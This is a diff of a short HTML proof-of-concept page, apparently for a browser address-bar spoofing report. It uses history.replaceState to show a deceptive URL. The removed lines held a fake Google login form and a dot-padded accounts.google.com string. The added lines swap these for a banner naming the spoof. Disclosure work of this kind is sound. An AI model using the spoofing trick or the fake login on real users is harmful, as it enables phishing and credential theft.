@@ -1,44 +1,21 @@
 <button id="button">Click PoC</button>
 
-<style>
-#fakeLogin {
-    display: none;
-    width: 300px;
-    padding: 20px;
-    margin-top: 20px;
-    border-radius: 10px;
-    border: 1px solid #ccc;
-    font-family: Arial, sans-serif;
-}
-#fakeLogin input {
-    width: 100%;
-    padding: 8px;
-    margin: 6px 0;
-}
-#fakeLogin button {
-    width: 100%;
-    padding: 10px;
-    cursor: pointer;
-}
-</style>
-
-<div id="fakeLogin">
-    <h3>Google Login Form</h3>
-    <input type="text" placeholder="Demo username (free text)">
-    <input type="password" placeholder="Demo password (free text)">
-    <button>Submit</button>
+<div id="indicator" style="display:none; padding:10px; margin-top:10px; background:#ffee99; border:1px solid #ccaa33;">
+    <b></b> Hi, this is the official Google page.
+Please note the URL above, the Google page has been redirected to <a href="https://evil.com">evil.com</a>.
 </div>
 
 <script>
 button.onclick = () => {
-    // Inject deceptive URL
+
+    // Fake URL injection
     history.replaceState(
         null,
         '',
-        '?...............................https://accounts.google.com/'
+        '?login=https://accounts.example.com/security-check'
     );
 
-    // Show fake login form
-    document.getElementById('fakeLogin').style.display = 'block';
+    // Indicator
+    document.getElementById('indicator').style.display = 'block';
 };
 </script>
